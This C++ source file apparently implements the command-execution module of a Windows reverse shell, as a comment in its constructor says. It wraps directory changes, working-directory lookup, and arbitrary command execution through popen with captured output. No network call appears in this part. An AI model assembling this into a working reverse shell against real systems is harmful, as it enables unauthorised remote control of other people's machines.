#include <iostream>
#include <winsock2.h>
#include <cstdio>
#include <windows.h>
#include <direct.h> //_chdir
#include "../inc/ModShell.h"
#include "../inc/common.h"

using namespace std;


ModShell::ModShell()
{
    //Take care of all the reverse shell part.
    ;
}
int ModShell::changeDirectory(string path)
{
//    cout << path.substr(3,path.length()) << endl;
    if(_chdir((path.substr(3,path.length())).c_str())!=0)
    {
        return 1;
    }

    return 0;
}
string ModShell::getPath()
{
    char* buffer;
   // Get the current working directory:
    if ( (buffer = _getcwd( NULL, 0 )) == NULL )
        ;
    string path = buffer;
    return path;
}

int ModShell::exec(string command,string &result)
{
    //command += " 2>&1"; //for catch stderr
    char buffer[1024];
    //cout << "dans exec: " <<command  <<endl;
    FILE* pipe = popen(command.c_str(), "rt");
    if (!pipe) 
    { 
        ///popen fail;
        cout << "fail" <<endl;
        return 1;
        //return "popen failed!";
    }
    // read till end of process:

    while (!feof(pipe)) 
    {   memset(buffer,0,sizeof(buffer));
        // use buffer to read and add to result
        if (fgets(buffer, sizeof(buffer), pipe) != NULL)
        {
        //    cout << "In mod shell: " << buffer<< endl;
            result.append(buffer,strlen(buffer));
        }
       // cout <<"Buffer in modshell: " << buffer << endl;
       // memset(buffer,0,sizeof(buffer));
    }
    pclose(pipe);
    //cout << "Size result: " << result.length() <<endl;
    cout << "Mod shell finish " << endl;
    return 0;
}